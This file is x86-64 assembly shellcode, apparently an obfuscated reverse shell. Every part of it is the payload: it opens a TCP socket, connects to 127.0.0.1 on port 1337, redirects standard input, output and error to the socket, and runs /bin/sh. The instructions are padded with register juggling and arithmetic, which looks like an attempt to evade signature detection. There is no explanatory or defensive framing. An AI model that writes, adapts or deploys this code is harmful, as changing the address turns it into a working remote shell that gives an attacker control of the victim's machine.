BITS 64
global _start

section .text
_start: 
xor r15,r15
mov rax,r15
xor rdi,rdi
xor r8,r8
mov rsi,r8
xor rdx,rdx
xor r14,r14
mov rdx,r14
mov sil,0x01
mov dil,17
sub dil,15
mov al,0x29
syscall
mov r14b,al
mov dil,r14b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r9,rsp
mov rsi,r9
mov dl,0x10
mov al,53
sub al,11
syscall
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov r12,r11
mov rsi,r12
mov al,0x21
syscall
xor r9,r9
mov r11,r9
mov dil,0x03
mov sil,11
sub sil,10
mov al,0x21
syscall;
xor r12,r12
mov r11,r12
mov dil,0x03
mov sil,4
sub sil,2
mov al,0x21
syscall;
mov rax,0x01
sub rax,0x01
xor rdi,rdi
mov rsi,0x01
sub rsi,0x01
xor r13,r13
mov r12b,59
mov al,r12b
mov rdi,"/bin/sh"
push r13
push rdi
mov r12,rsp
mov rdi,r12
push r13
push rdi
mov r15,rsp
mov rsi,r15
xor rdx,rdx
syscall
